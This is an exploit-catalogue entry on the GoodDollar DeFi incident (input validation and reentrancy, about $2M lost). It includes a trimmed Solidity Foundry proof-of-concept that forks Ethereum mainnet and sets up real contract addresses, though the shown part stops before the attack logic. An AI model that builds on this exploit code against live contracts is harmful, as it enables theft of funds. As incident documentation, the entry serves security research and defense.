# [?] GoodDollar - Lack of Input Validation & Reentrancy

## Summary
Severity: Unknown
Chain: Ethereum
Component: GoodDollar
Published: 2023-12-16
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/GoodDollar_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$2M
References:
- https://twitter.com/MetaSec_xyz/status/1736428284756607386

```solidity
contract ContractTest is Test {
    IBalancerVault private constant Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWrappedEther private constant WrappedEther = IWrappedEther(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant GoodDollarToken = IERC20(0x67C5870b4A41D4Ebef24d2456547A03F1f3e094B);
    IcETH private constant cETH = IcETH(payable(0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5));
    ICErc20Delegate private constant cDAI = ICErc20Delegate(payable(0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643));
    ICointroller private constant Comptroller = ICointroller(0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B);
    IGDX private constant GDX = IGDX(0xa150a825d425B36329D8294eeF8bD0fE68f8F6E0);
    address private constant originalExploitContract = 0xF06Ab383528F51dA67E2b2407327731770156ED6;
    address private constant participant = 0x6C08f56ff2B15dB7ddf2F123f5BFFB68e308161B;

    function setUp() public {
        vm.createSelectFork("mainnet", 18_802_014);
        vm.label(address(Balancer), "Balancer");
        vm.label(address(WrappedEther), "WrappedEther");
        vm.label(address(DAI), "DAI");
        vm.label(address(GoodDollarToken), "GoodDollarToken");
        vm.label(address(cETH), "cETH");
        vm.label(address(cDAI), "cDAI");
        vm.label(address(Comptroller), "Comptroller");
        vm.label(address(GDX), "GDX");
    }

    function testExploit() public {
        deal(address(this), 0);
        emit log_named_decimal_uint("Exploiter DAI balance before attack", DAI.balanceOf(address(this)), DAI.decimals());

        emit log_named_decimal_uint(
            "Exploiter GoodDollarToken balance before attack",
            GoodDollarToken.balanceOf(address(this)),
            GoodDollarToken.decimals()
        );
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/GoodDollar_exp.sol_
